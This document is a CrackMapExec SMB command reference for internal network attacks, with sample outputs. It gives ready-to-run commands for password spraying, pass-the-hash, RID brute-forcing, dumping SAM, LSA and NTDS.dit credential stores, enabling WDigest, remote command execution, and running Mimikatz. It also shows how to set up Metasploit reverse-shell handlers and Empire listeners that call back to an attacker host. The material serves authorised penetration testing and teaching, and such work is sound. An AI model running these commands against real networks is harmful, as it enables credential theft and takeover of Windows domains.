# SMB: Command Reference

Notes about command reference:  
The following use cases assume you have a Kali Linux host connected to an internal network.  
For the examples it is also assumed hosts are within a 192.168.1.0/24 IP space. If CME isnt giving output of anykind, you probably have something wrong with the command.

---

# Mapping/Enumeration

[Mapping/Enumeration](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference#mappingenumeration)
## Map network hosts


```
#~ cme smb 192.168.1.0/24
```

Expected Results:

```
SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)
SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)
SMB         192.168.1.110    445    DC2016A          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC2016A) (domain:OCEAN) (signing:True) (SMBv1:True)
SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)

```

## Connections and Spraying
```bash
Connexions & Spraying

# Target format
crackmapexec smb ms.evilcorp.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt

# Null session
crackmapexec smb 192.168.10.1 -u "" up ""

# Connect to target using local account
crackmapexec smb 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth

# Pass the hash against a subnet
crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'

# Bruteforcing and Password Spraying
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
```

## Enumeration Users

## Enumerate users
```
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users
```

## Perform RID Bruteforce to get users
```
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute
```

# Enumerate domain groups
```
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups
```

## Enumerate local users
```
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users
```
Hosts

## Generate a list of relayable hosts (SMB Signing disabled)
```bash
crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt
```

## Enumerate available shares
```bash
crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares
```

## Get the active sessions
```bash
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions
```

## Check logged in users
```bash
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers
```

## Get the password policy
```bash
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
```

Execution & Co

# CrackMapExec has 3 different command execution methods (in default order) :
# - wmiexec --> WMI
# - atexec --> scheduled task
# - smbexec --> creating and running a service

# Execute command through cmd.exe (admin privileges required)
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'

# Force the smbexec method
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec

# Execute commands through PowerShell (admin privileges required)
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'

Getting Credentials

# Dump local SAM hashes
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam

# Enable or disable WDigest to get credentials from the LSA Memory
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable

# Then you juste have to wait the user logoff and logon again
# But you can force the logoff
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'quser'
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'

# Dump the NTDS.dit from DC using methods from secretsdump.py

# Uses drsuapi RPC interface create a handle, trigger replication
# and combined with additional drsuapi calls to convert the resultant 
# linked-lists into readable format
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds

# Uses the Volume Shadow copy Service
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss

# Dump the NTDS.dit password history
smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history

Using the database

# The database automatically store every hosts reaches by CME and all credentials with admin access
$ cmedb

# Using workspaces
cmedb> workspace create test
cmedb> workspace test

# Access a protocol database and switch back
cmedb (test)> proto smb
cmedb (test)> back

# List stored hosts
cmedb> hosts

# View detailed infos for a specific machine (including creds)
cmedb> hosts <hostname>

# Get stored credentials
cmedb> creds

# Get credentials access for a specific account
cmedb> creds <username>

# Using credentials from the database
crackmapexec smb 192.168.100.1 -id <credsID>

Modules

# List available modules
crackmapexec smb -L

# Module information
crackmapexec smb -M mimikatz --module-info

# View module options
crackmapexec smb -M mimikatz --options

# Mimikatz module
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz
crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'

[*] Get-ComputerDetails       Enumerates sysinfo
[*] bloodhound                Executes the BloodHound recon script on the target and retreives the results to the attackers\' machine
[*] empire_exec               Uses Empire\'s RESTful API to generate a launcher for the specified listener and executes it
[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
[*] enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] get_keystrokes            Logs keys pressed, time and the active window
[*] get_netdomaincontroller   Enumerates all domain controllers
[*] get_netrdpsession         Enumerates all active RDP sessions
[*] get_timedscreenshot       Takes screenshots at a regular interval
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
[*] invoke_vnc                Injects a VNC client in memory
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] mimikatz                  Dumps all logon credentials from memory
[*] mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz
[*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager
[*] mimikittenz               Executes Mimikittenz
[*] multirdp                  Patches terminal services in memory to allow multiple RDP users
[*] netripper                 Capture`\'s credentials by using API hooking
[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory
[*] rdp                       Enables/Disables RDP
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
[*] shellcode_inject          Downloads the specified raw shellcode and injects it into memory
[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
[*] test_connection           Pings a host
[*] tokens                    Enumerates available tokens
[*] uac                       Checks UAC status
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module

Getting shells
Metasploit

# First, set up a HTTP Reverse Handler
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_https
msf exploit(handler) > set LHOST 192.168.10.3
msf exploit(handler) > set exitonsession false
msf exploit(handler) > exploit -j

# Met_Inject module
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444 

Empire

# Start RESTful API
empire --rest --user empireadmin --pass gH25Iv1K68@^

# First setup an Empire HTTP listener
(Empire: listeners) > set Name test
(Empire: listeners) > set Host 192.168.10.3
(Empire: listeners) > set Port 9090
(Empire: listeners) > set CertPath data/empire.pem
(Empire: listeners) > run
(Empire: listeners) > list

# Start RESTful API
# The username and password that CME uses to authenticate to Empire's RESTful API 
# Are stored in the cme.conf file located at ~/.cme/cme.conf
empire --rest --user empireadmin --pass gH25Iv1K68@^

# Empire Module
crackmapexec smb 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER=CMETest
```
## Generate Relay List

[](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference#generate-relay-list)

Maps the network of live hosts and saves a list of only the hosts that dont require SMB signing.  
List format is one IP per line

```
#~ cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt
```

Expected Results:

```
SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)
SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)
SMB         192.168.1.111    445    SERVER1          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SERVER1) (domain:PACIFIC) (signing:False) (SMBv1:True)
SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
...SNIP...

#~ cat relaylistOutputFilename.txt
192.168.1.111
192.168.1.117
```

## Enumerate shares and access

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
```

## Enumerate active sessions

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sessions
```

## Enumerate disks

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --disks
```

## Enumerate logged on users

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users
```

## Enumerate domain users

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users
```

## Enumerate users by bruteforcing RID

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
```

## Enumerate domain groups

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --groups
```

## Enumerate local groups

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-groups
```

## Obtain domain password policy

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol
```

---



# Authentication + Checking Credentials (Domain)


Failed logins result in a [-]  
Successful logins result in a [+] Domain\Username:Password

Local admin access results in a (Pwn3d!) added after the login confirmation, shown below.

```
	SMB         192.168.1.101    445    HOSTNAME          [+] DOMAIN\Username:Password (Pwn3d!)  
```

The following checks will attempt authentication to the entire /24 though a single target may also be used.

## User/Password


```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE'
```

## User/Hash


After obtaining credentials such as  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::  
you can use both the full hash or just the nt hash (second half)

```
#~ cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
#~ cme smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
#~ cme smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
#~ cme smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
```

## Null Sessions


```
#~ cme smb 192.168.1.0/24 -u '' -p ''
```

If multiple domains are in play you may need to specify the target domain using -d  
For example authenticating to the domain labnet.com

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p "PASSWORDHERE" -d LABNET
```

## Using Username/Password Lists


You can use multiple usernames or passwords by seperating the names/passwords with a space.

```
#~ cme smb 192.168.1.101 -u user1 user2 user3 -p Summer18
#~ cme smb 192.168.1.101 -u user1 -p password1 password2 password3
```

CME accepts txt files of usernames and passwords. One user/password per line. Watch out for account lockout!

```
#~ cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18
#~ cme smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt
```

*Note*: By default CME will exit after a successful login is found. Using the --continue-on-success flag will continue spraying even after a valid password is found. Usefull for spraying a single password against a large user list Usage example:

```
#~ cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success
```

---

# Authentication/Checking credentials (Local)

Adding --local-auth to any of the authentication commands with attempt to logon locally.

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-auth
#~ cme smb 192.168.1.0/24 -u '' -p '' --local-auth
#~ cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --local-auth
#~ cme smb 192.168.1.0/24 -u UserNAme -H 'NTHASH' --local-auth
#~ cme smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
#~ cme smb 192.168.1.0/24 -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
```

Results will display the hostname next to the user:password

```
	SMB         192.168.1.101    445    HOSTNAME          [+] HOSTNAME\Username:Password (Pwn3d!)  
```

---


# Obtaining Credentials


The following examples use a username and plaintext password although user/hash combos work as well.

*Requires Local Admin  
***Requires Domain Admin or Local Admin Priviledges on target Domain Controller

## *Dump SAM hashes using methods from secretsdump.py


```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

## *Dump LSA secrets using methods from secretsdump.py


```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

## ***Dump the NTDS.dit from target DC using methods from secretsdump.py


```
2 methods are available:   
(default) 	drsuapi -  Uses drsuapi RPC interface create a handle, trigger replication, and combined with   
						additional drsuapi calls to convert the resultant linked-lists into readable format  
			vss - Uses the Volume Shadow copy Service  
```

```
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

## ***Dump the NTDS.dit password history from target DC using methods from secretsdump.py


```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

## ***Show the pwdLastSet attribute for each NTDS.dit account


```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

---

---

# Spidering Shares

Options for spidering shares of remote systems.

## ***Spider the C drive for files with txt in the name (finds both sometxtfile.html and somefile.txt)

Notice the '$' character has to be escaped. (example shown can be used as-is in a kali linux terminal)

```
#~ cme SMB <IP> -u USER -p PASSWORD --spider C\$ --pattern txt
```

---



# Command Execution

Options for executing commands on remote systems.

# Execution Methods

CME has three different command execution methods:

- `wmiexec` executes commands via WMI
- `atexec` executes commands by scheduling a task with windows task scheduler
- `smbexec` executes commands by creating and running a service

By default CME will fail over to a different execution method if one fails. It attempts to execute commands in the following order:

1. `wmiexec`
2. `atexec`
3. `smbexec`

If you want to force CME to use only one execution method you can specify which one using the `--exec-method` flag.  
The command execution method is denoted in the Executed Command output line.  
WMIEXEC example, note the 'Executed command via wmiexec' output line.

```
root@EvilRick:~# cme smb 10.10.33.121 -u Administrator -p AAdmin\!23 -X '$PSVersionTable' --exec-method wmiexec
SMB         10.10.33.121    445    DESKTOP1         [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:DESKTOP1) (domain:PACIFIC) (signing:False) (SMBv1:True)
SMB         10.10.33.121    445    DESKTOP1         [+] PACIFIC\Administrator:AAdmin!23 (Pwn3d!)
SMB         10.10.33.121    445    DESKTOP1         [+] Executed command via wmiexec
SMB         10.10.33.121    445    DESKTOP1         Name                           Value
SMB         10.10.33.121    445    DESKTOP1         ----                           -----
SMB         10.10.33.121    445    DESKTOP1         CLRVersion                     2.0.50727.8793
SMB         10.10.33.121    445    DESKTOP1         BuildVersion                   6.1.7601.17514
SMB         10.10.33.121    445    DESKTOP1         PSVersion                      2.0
SMB         10.10.33.121    445    DESKTOP1         WSManStackVersion              2.0
SMB         10.10.33.121    445    DESKTOP1         PSCompatibleVersions           {1.0, 2.0}
SMB         10.10.33.121    445    DESKTOP1         SerializationVersion           1.1.0.1
SMB         10.10.33.121    445    DESKTOP1         PSRemotingProtocolVersion      2.1
```

## Executing Commands

## Currently Broken in bleeding edge.

In the following example, we try to execute `whoami` on the target using the `-x` flag:

```
#~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
SMB         192.168.10.11    445    WIN7BOX         [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:WIN7BOX) (domain:LAB) (signing:False) (SMBv1:True)
SMB         192.168.10.11    445    WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
SMB         192.168.10.11    445    WIN7BOX         [+] Executed command 
SMB         192.168.10.11    445    WIN7BOX         lab\administrator
```

## Executing Powershell Commands

You can also directly execute PowerShell commands using the `-X` flag:

```
#~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
SMB         192.168.10.11    445    WIN7BOX          [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:WIN7BOX) (domain:LAB) (signing:False) (SMBv1:True)
SMB         192.168.10.11    445    WIN7BOX          [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
SMB         192.168.10.11    445    WIN7BOX          [+] Executed command
SMB         192.168.10.11    445    WIN7BOX          Name                           Value
SMB         192.168.10.11    445    WIN7BOX          ----                           -----
SMB         192.168.10.11    445    WIN7BOX          CLRVersion                     2.0.50727.8793
SMB         192.168.10.11    445    WIN7BOX          BuildVersion                   6.1.7601.17514
SMB         192.168.10.11    445    WIN7BOX          PSVersion                      2.0
SMB         192.168.10.11    445    WIN7BOX          WSManStackVersion              2.0
SMB         192.168.10.11    445    WIN7BOX          PSCompatibleVersions           {1.0, 2.0}
SMB         192.168.10.11    445    WIN7BOX          SerializationVersion           1.1.0.1
SMB         192.168.10.11    445    WIN7BOX          PSRemotingProtocolVersion      2.1
```

Powershell commands can be forced to run in a 32bit process:

```
#~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '[System.Environment]::Is64BitProcess' --force-ps32
SMB         192.168.10.11    445    WIN7BOX          [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:WIN7BOX) (domain:LAB) (signing:False) (SMBv1:True)
SMB         192.168.10.11    445    WIN7BOX          [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
SMB         192.168.10.11    445    WIN7BOX          [+] Executed command
SMB         192.168.10.11    445    WIN7BOX          false
```

Other switches include:

```
--no-output       Does not retrieve command results
```

---



# WMI Query Execution

See more about wmi queries and syntax here: [https://docs.microsoft.com/en-us/windows/desktop/wmisdk/invoking-a-synchronous-query](https://docs.microsoft.com/en-us/windows/desktop/wmisdk/invoking-a-synchronous-query)

## Issues the specified WMI query

User/Password

```
#~ cme smb 10.10.33.121 -u Administrator -p 'P@ssw0rd' --wmi "SELECT * FROM Win32_logicalDisk WHERE DeviceID = 'C:'"
SMB         192.168.10.11    445    WIN7BOX         [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:WIN7BOX) (domain:LAB) (signing:False) (SMBv1:True)
SMB         192.168.10.11    445    WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
SMB         192.168.10.11    445    WIN7BOX         Caption => C:
SMB         192.168.10.11    445    WIN7BOX         Description => Local Fixed Disk
SMB         192.168.10.11    445    WIN7BOX         InstallDate => 0
SMB         192.168.10.11    445    WIN7BOX         Name => C:
SMB         192.168.10.11    445    WIN7BOX         Status => 0
SMB         192.168.10.11    445    WIN7BOX         Availability => 0
SMB         192.168.10.11    445    WIN7BOX         CreationClassName => Win32_LogicalDisk
SMB         192.168.10.11    445    WIN7BOX         ConfigManagerErrorCode => 0
SMB         192.168.10.11    445    WIN7BOX         ConfigManagerUserConfig => 0
SMB         192.168.10.11    445    WIN7BOX         DeviceID => C:
```
